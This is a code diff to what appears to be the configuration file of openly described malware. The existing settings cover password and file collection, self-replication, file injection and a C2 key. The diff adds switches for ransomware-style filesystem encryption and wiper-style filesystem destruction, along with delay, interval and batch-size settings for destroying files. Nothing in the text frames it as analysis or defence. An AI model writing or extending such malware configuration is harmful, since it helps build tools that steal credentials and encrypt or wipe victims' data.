@@ -24,6 +24,8 @@ ENABLE_PASSWORD_COLLECTION = True
 ENABLE_FILE_COLLECTION = True
 ENABLE_SELF_REPLICATION = True
 ENABLE_FILE_INJECTION = True
+ENABLE_FILESYSTEM_ENCRYPTION = True  # Encrypt filesystem (ransomware-like)
+ENABLE_FILESYSTEM_WIPING = False  # Wipe filesystem (wiper-like) - DANGEROUS!
 
 # Timing Configuration
 SCREENSHOT_INTERVAL = 30
@@ -39,4 +41,9 @@ C2_KEY = "default_key_change_me"
 # Auto-close when exploitation complete
 AUTO_CLOSE_AFTER_COLLECTION = False  # Set to False to keep virus running after collection
 COLLECTION_TIMEOUT = 300  # 5 minutes max for initial collection
+
+# Filesystem Destruction Configuration
+DESTRUCTION_DELAY = 60  # Delay before starting destruction (seconds)
+DESTRUCTION_INTERVAL = 300  # Interval between destruction batches (seconds)
+DESTRUCTION_BATCH_SIZE = 1000  # Max files per batch (None = unlimited)
 
